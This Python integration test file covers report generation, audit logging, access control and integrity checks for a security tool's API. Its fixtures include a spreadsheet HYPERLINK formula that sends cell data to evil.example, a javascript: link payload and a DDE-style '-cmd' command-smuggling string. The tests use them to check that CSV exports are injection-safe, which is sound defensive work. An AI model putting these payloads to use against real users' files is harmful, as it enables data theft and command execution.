"""Reports end to end on real Postgres and Redis (Phase 13 acceptance).

Request -> worker -> download, for tool runs and playbook runs, in every
format; the audit trail (exported, generated, downloaded); RBAC; integrity
checking on download; CSV-injection safety on real data; append-only grants;
and the admin audit-trail export.

As in the run tests, the broker is replaced by capturing dispatchers and the
worker bodies (``execute_run``, ``execute_playbook``, ``generate_report``)
run in-process on their own event loop and engine.
"""

import csv
import hashlib
import io
import json
import uuid
from collections.abc import Callable, Coroutine, Iterator
from typing import Any

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient
from pydantic import BaseModel, ConfigDict

from app.config import get_settings
from app.core.auth.roles import Role
from app.core.runs import events
from app.core.runs.dispatch import get_dispatcher
from app.core.tasks.tool_task import execute_run
from app.db import session as db_session
from app.engine.base_tool import BaseTool, RawOutput, ToolContext
from app.engine.registry import registry
from app.engine.schemas import Finding, FindingStatus, Severity, ToolCategory
from app.playbooks.dispatch import get_playbook_dispatcher
from app.playbooks.engine import execute_playbook
from app.playbooks.loader import definitions
from app.playbooks.schemas import PlaybookDefinition
from app.reports.dispatch import get_report_dispatcher
from app.reports.generate import generate_report
from tests.integration.conftest import Database, csrf, login, run

HOSTILE = '=HYPERLINK("http://evil.example/?"&A1,"click")'
MARKUP = '<a href="javascript:alert(1)">x</a>'

# --- test doubles ----------------------------------------------------------------------


class NoParams(BaseModel):
    model_config = ConfigDict(extra="forbid")


class HostileBannerTool(BaseTool[NoParams]):
    """Reports what a malicious service might send back: formulas and markup."""

    tool_id = "rp_hostile"
    name = "Hostile banner"
    description = "test"
    version = "2.1.0"
    category = ToolCategory.DIAGNOSTIC
    params_model = NoParams

    async def run(self, params: NoParams, ctx: ToolContext) -> RawOutput:
        return {"banner": HOSTILE, "html": MARKUP}

    def translate(self, raw: RawOutput, params: NoParams) -> list[Finding]:
        return [
            Finding(
                item=f"Banner {HOSTILE}",
                category="EXPOSURE",
                status=FindingStatus.DETECTED,
                severity=Severity.HIGH,
                severity_rationale="Test rationale.",
                explanation=f"The service said {MARKUP}.",
                remediation="-cmd|' /C calc'!A0",
                evidence={"banner": HOSTILE},
                references=["javascript:alert(1)"],
            )
        ]


class Captured:
    def __init__(self) -> None:
        self.sent: list[uuid.UUID] = []
        self.fail = False

    def send(self, item_id: uuid.UUID, *_: Any) -> str:
        if self.fail:
            raise ConnectionError("broker down")
        self.sent.append(item_id)
        return f"task-{item_id}"

    def revoke(self, task_id: str) -> None:
        return None


PLAYBOOK = PlaybookDefinition.model_validate(
    {
        "id": "rp_audit",
        "name": "Report test playbook",
        "version": "1.0.0",
        "description": "test playbook",
        "target_input": "target",
        "inputs": {"target": {"kind": "string", "title": "Target"}},
        "steps": [
            {
                "id": "greet",
                "name": "Greet",
                "tool_id": "echo",
                "params": {"message": "{{ inputs.target }}"},
            },
            {"id": "banner", "name": "Banner grab", "tool_id": "rp_hostile"},
            {"id": "later", "name": "Later", "tool_id": "not_installed_yet", "optional": True},
        ],
    }
)


@pytest.fixture(autouse=True)
def test_registrations() -> Iterator[None]:
    registry.register(HostileBannerTool)
    definitions()[PLAYBOOK.id] = PLAYBOOK
    yield
    definitions().pop(PLAYBOOK.id, None)
    registry._tools.pop(HostileBannerTool.tool_id, None)


@pytest.fixture
def dispatchers(app: FastAPI) -> Iterator[dict[str, Captured]]:
    captured = {"runs": Captured(), "playbooks": Captured(), "reports": Captured()}
    app.dependency_overrides[get_dispatcher] = lambda: captured["runs"]
    app.dependency_overrides[get_playbook_dispatcher] = lambda: captured["playbooks"]
    app.dependency_overrides[get_report_dispatcher] = lambda: captured["reports"]
    yield captured
    for dependency in (get_dispatcher, get_playbook_dispatcher, get_report_dispatcher):
        app.dependency_overrides.pop(dependency, None)


@pytest.fixture
def analyst(client: TestClient, make_user: Callable[..., Any]) -> Any:
    user_id = make_user("ana", Role.ANALYST)
    assert login(client, "ana").status_code == 200
    return user_id


def as_worker[T](coro_factory: Callable[[], Coroutine[Any, Any, T]]) -> T:
    """Run a worker body on its own loop, engine and Redis client (like a worker process)."""
    saved = (db_session._engine, db_session._sessionmaker)
    saved_redis = (events._client, events._client_loop)
    db_session.forget_engine()
    events.forget_client()

    async def go() -> T:
        try:
            return await coro_factory()
        finally:
            await db_session.dispose_engine()
            await events.close_redis()

    try:
        return run(go())
    finally:
        db_session._engine, db_session._sessionmaker = saved
        events._client, events._client_loop = saved_redis


def finished_tool_run(client: TestClient, tool_id: str = "rp_hostile", **params: Any) -> str:
    response = client.post(
        f"/api/v1/tools/{tool_id}/runs", json={"params": params}, headers=csrf(client)
    )
    assert response.status_code == 202, response.text
    run_id = response.json()["run_id"]
    assert as_worker(lambda: execute_run(uuid.UUID(run_id))) == "COMPLETED"
    return str(run_id)


def request_report(client: TestClient, source_type: str, source_id: str, fmt: str) -> Any:
    return client.post(
        "/api/v1/reports",
        json={"source_type": source_type, "source_id": source_id, "format": fmt},
        headers=csrf(client),
    )


def generated(client: TestClient, source_type: str, source_id: str, fmt: str) -> dict[str, Any]:
    response = request_report(client, source_type, source_id, fmt)
    assert response.status_code == 202, response.text
    report_id = response.json()["report_id"]
    assert as_worker(lambda: generate_report(uuid.UUID(report_id))) == "COMPLETED"
    body: dict[str, Any] = client.get(f"/api/v1/reports/{report_id}").json()
    return body


# --- tests --------------------------------------------------------------------------------


@pytest.mark.parametrize("fmt", ["pdf", "csv", "json", "txt"])
def test_tool_run_report_request_generate_download_and_audit(
    client: TestClient,
    db: Database,
    analyst: Any,
    dispatchers: dict[str, Captured],
    fmt: str,
) -> None:
    run_id = finished_tool_run(client)
    response = request_report(client, "tool_run", run_id, fmt)
    assert response.status_code == 202, response.text
    queued = response.json()
    assert queued["status"] == "QUEUED" and queued["requested_by"] == "ana"
    assert queued["title"] == "Hostile banner report"
    report_id = queued["report_id"]
    assert dispatchers["reports"].sent == [uuid.UUID(report_id)]

    assert as_worker(lambda: generate_report(uuid.UUID(report_id))) == "COMPLETED"
    # A redelivered message for a finished report does nothing.
    assert as_worker(lambda: generate_report(uuid.UUID(report_id))) == "COMPLETED"
    report = client.get(f"/api/v1/reports/{report_id}").json()
    assert report["status"] == "COMPLETED" and report["error"] is None
    assert report["filename"].startswith("sentinel-run-Hostile-banner-")
    assert report["filename"].endswith(f".{fmt}")

    download = client.get(f"/api/v1/reports/{report_id}/download")
    assert download.status_code == 200
    content = download.content
    assert len(content) == report["size_bytes"]
    assert hashlib.sha256(content).hexdigest() == report["sha256"]
    assert download.headers["x-report-sha256"] == report["sha256"]
    assert download.headers["content-disposition"] == f'attachment; filename="{report["filename"]}"'
    assert download.headers["cache-control"] == "no-store"
    assert download.headers["x-content-type-options"] == "nosniff"
    if fmt == "pdf":
        assert content.startswith(b"%PDF-") and b"/URI" not in content
    elif fmt == "json":
        doc = json.loads(content)
        assert doc["subject"]["id"] == run_id and doc["tools"][0]["version"] == "2.1.0"
        assert doc["raw"][0]["data"]["banner"] == HOSTILE
    elif fmt == "txt":
        assert f"Banner {HOSTILE}" in content.decode()

    [exported] = db.audit("report.exported")
    assert exported["username"] == "ana" and exported["resource_id"] == report_id
    assert exported["details"] == {"source_type": "tool_run", "source_id": run_id, "format": fmt}
    [made] = db.audit("report.generated")
    assert made["outcome"] == "SUCCESS" and made["service"] == "worker"
    assert made["username"] == "ana" and made["details"]["sha256"] == report["sha256"]
    [downloaded] = db.audit("report.downloaded")
    assert downloaded["outcome"] == "SUCCESS" and downloaded["details"]["format"] == fmt


def test_csv_report_from_real_data_is_injection_safe(
    client: TestClient, analyst: Any, dispatchers: dict[str, Captured]
) -> None:
    run_id = finished_tool_run(client)
    report = generated(client, "tool_run", run_id, "csv")
    content = client.get(f"/api/v1/reports/{report['report_id']}/download").content
    rows = list(csv.reader(io.StringIO(content.decode("utf-8-sig"))))
    assert len(rows) == 2
    for cell in rows[1]:
        assert cell.lstrip()[:1] not in ("=", "+", "-", "@"), cell
    columns = dict(zip(rows[0], rows[1], strict=True))
    assert columns["item"] == f"Banner {HOSTILE}"  # starts with "Banner": left as is
    assert columns["remediation"] == "'-cmd|' /C calc'!A0"
    assert columns["references"] == "javascript:alert(1)"


def test_playbook_report_has_steps_tools_and_unified_findings(
    client: TestClient, db: Database, analyst: Any, dispatchers: dict[str, Captured]
) -> None:
    started = client.post(
        f"/api/v1/playbooks/{PLAYBOOK.id}/runs",
        json={"inputs": {"target": "example"}},
        headers=csrf(client),
    )
    assert started.status_code == 202, started.text
    playbook_run_id = started.json()["playbook_run_id"]
    assert as_worker(lambda: execute_playbook(uuid.UUID(playbook_run_id))) == "COMPLETED"

    report = generated(client, "playbook_run", playbook_run_id, "json")
    assert report["title"] == "Report test playbook report" and report["target"] == "example"
    doc = client.get(f"/api/v1/reports/{report['report_id']}/download").json()
    assert doc["subject"]["kind"] == "playbook_run" and doc["subject"]["parameters"] == {
        "target": "example"
    }
    assert [s["status"] for s in doc["steps"]] == ["COMPLETED", "COMPLETED", "SKIPPED"]
    assert {t["tool_id"] for t in doc["tools"]} == {"echo", "rp_hostile"}
    assert [f["step_id"] for f in doc["findings"]] == ["banner", "greet"]  # HIGH first
    assert doc["risk"] == client.get(f"/api/v1/playbook-runs/{playbook_run_id}").json()["risk"]
    assert len(doc["raw"]) == 2

    pdf = generated(client, "playbook_run", playbook_run_id, "pdf")
    content = client.get(f"/api/v1/reports/{pdf['report_id']}/download").content
    assert content.startswith(b"%PDF-") and pdf["size_bytes"] > 5000
    assert pdf["filename"].startswith("sentinel-playbook-Report-test-playbook-example-")

    page = client.get("/api/v1/reports", params={"source_id": playbook_run_id}).json()
    assert [r["format"] for r in page["reports"]] == ["pdf", "json"]


def test_report_request_rules(
    client: TestClient,
    db: Database,
    analyst: Any,
    make_user: Callable[..., Any],
    dispatchers: dict[str, Captured],
) -> None:
    # Unknown source, unknown format, unfinished run.
    assert request_report(client, "tool_run", str(uuid.uuid4()), "pdf").status_code == 404
    run_id = finished_tool_run(client)
    bad_format = request_report(client, "tool_run", run_id, "docx")
    assert bad_format.status_code == 422
    assert "pdf" in bad_format.json()["error"]["message"]
    queued = client.post(
        "/api/v1/tools/echo/runs", json={"params": {"message": "x"}}, headers=csrf(client)
    ).json()["run_id"]
    assert request_report(client, "tool_run", queued, "pdf").status_code == 409

    # Not ready yet: no download.
    report_id = request_report(client, "tool_run", run_id, "pdf").json()["report_id"]
    assert client.get(f"/api/v1/reports/{report_id}/download").status_code == 409
    assert db.audit("report.downloaded") == []

    # A viewer can read and download reports, but not request them.
    as_worker(lambda: generate_report(uuid.UUID(report_id)))
    make_user("vic", Role.VIEWER)
    login(client, "vic")
    assert request_report(client, "tool_run", run_id, "pdf").status_code == 403
    assert client.get(f"/api/v1/reports/{report_id}/download").status_code == 200
    assert client.get("/api/v1/reports", params={"mine": True}).json()["reports"] == []
    assert db.audit("report.downloaded")[0]["username"] == "vic"


def test_dispatch_failure_marks_the_report_failed(
    client: TestClient, db: Database, analyst: Any, dispatchers: dict[str, Captured]
) -> None:
    run_id = finished_tool_run(client)
    dispatchers["reports"].fail = True
    response = request_report(client, "tool_run", run_id, "pdf")
    assert response.status_code == 503
    [report] = client.get("/api/v1/reports").json()["reports"]
    assert report["status"] == "FAILED" and report["error"]["code"] == "dispatch_failed"
    [event] = db.audit("report.generated")
    assert event["outcome"] == "FAILURE" and event["reason"] == "dispatch_failed"


def test_quota_on_reports_being_generated(
    client: TestClient, analyst: Any, dispatchers: dict[str, Captured]
) -> None:
    run_id = finished_tool_run(client)
    cap = get_settings().max_active_reports_per_user
    for _ in range(cap):
        assert request_report(client, "tool_run", run_id, "txt").status_code == 202
    assert request_report(client, "tool_run", run_id, "txt").status_code == 429


def test_redelivered_running_report_is_failed_not_rerendered(
    client: TestClient, db: Database, analyst: Any, dispatchers: dict[str, Captured]
) -> None:
    run_id = finished_tool_run(client)
    report_id = request_report(client, "tool_run", run_id, "pdf").json()["report_id"]
    db.execute("UPDATE reports SET status = 'RUNNING' WHERE id = :id", {"id": report_id})
    assert as_worker(lambda: generate_report(uuid.UUID(report_id))) == "FAILED"
    report = client.get(f"/api/v1/reports/{report_id}").json()
    assert report["error"]["code"] == "worker_lost"
    assert db.execute("SELECT count(*) AS n FROM report_blobs")[0]["n"] == 0


def test_tampered_report_is_refused_and_flagged(
    client: TestClient, db: Database, analyst: Any, dispatchers: dict[str, Captured]
) -> None:
    report = generated(client, "tool_run", finished_tool_run(client), "txt")
    db.execute(
        "UPDATE report_blobs SET content = :c WHERE report_id = :id",
        {"c": b"forged", "id": report["report_id"]},
        role="owner",
    )
    response = client.get(f"/api/v1/reports/{report['report_id']}/download")
    assert response.status_code == 500
    assert response.json()["error"]["code"] == "integrity_failed"
    assert b"forged" not in response.content
    [event] = db.audit("report.downloaded")
    assert event["outcome"] == "FAILURE" and event["reason"] == "integrity_failed"
    assert event["is_security_event"] is True


def test_report_tables_are_append_only_for_the_app(
    client: TestClient, db: Database, analyst: Any, dispatchers: dict[str, Captured]
) -> None:
    generated(client, "tool_run", finished_tool_run(client), "txt")
    for sql in (
        "DELETE FROM reports",
        "DELETE FROM report_blobs",
        "UPDATE report_blobs SET content = 'x'",
    ):
        with pytest.raises(Exception, match="permission denied"):
            db.execute(sql)


# --- admin audit export -----------------------------------------------------------------


def test_admin_exports_the_audit_trail_safely(
    client: TestClient, db: Database, make_user: Callable[..., Any]
) -> None:
    make_user("root", Role.ADMIN)
    # An attacker-controlled user agent lands in the audit trail on a failed login.
    client.post(
        "/api/v1/auth/login",
        json={"username": "root", "password": "wrong-password-1"},
        headers={"User-Agent": HOSTILE, "Origin": "http://localhost:5173"},
    )
    assert login(client, "root").status_code == 200

    response = client.get("/api/v1/admin/audit/export", params={"format": "csv"})
    assert response.status_code == 200, response.text
    assert response.headers["content-type"].startswith("text/csv")
    assert response.headers["x-export-truncated"] == "false"
    rows = list(csv.DictReader(io.StringIO(response.content.decode("utf-8-sig"))))
    failure = next(r for r in rows if r["action"] == "auth.login.failure")
    assert failure["user_agent"] == "'" + HOSTILE
    for row in rows:
        for cell in row.values():
            assert cell.lstrip()[:1] not in ("=", "+", "-", "@"), cell

    filtered = client.get(
        "/api/v1/admin/audit/export",
        params={"format": "json", "action": "auth.login.failure"},
    ).json()
    assert filtered["row_count"] == 1 and filtered["exported_by"] == "root"
    assert filtered["filters"]["action"] == "auth.login.failure"
    assert filtered["events"][0]["user_agent"] == HOSTILE  # JSON is data, not a spreadsheet

    exports = db.audit("audit.exported")
    assert [e["details"]["format"] for e in exports] == ["csv", "json"]
    assert exports[0]["details"]["rows"] == len(rows)


def test_audit_export_is_capped_and_says_so(
    app: FastAPI, client: TestClient, make_user: Callable[..., Any]
) -> None:
    make_user("root", Role.ADMIN)
    for _ in range(3):
        login(client, "root")
    settings = get_settings().model_copy(update={"audit_export_max_rows": 2})
    app.dependency_overrides[get_settings] = lambda: settings
    try:
        response = client.get("/api/v1/admin/audit/export", params={"format": "json"})
    finally:
        app.dependency_overrides.pop(get_settings, None)
    body = response.json()
    assert body["row_count"] == 2 and body["truncated"] is True
    assert response.headers["x-export-truncated"] == "true"


def test_audit_export_is_admin_only(
    client: TestClient, db: Database, make_user: Callable[..., Any]
) -> None:
    make_user("ana", Role.ANALYST)
    login(client, "ana")
    assert client.get("/api/v1/admin/audit/export").status_code == 403
    assert db.audit("audit.exported") == []
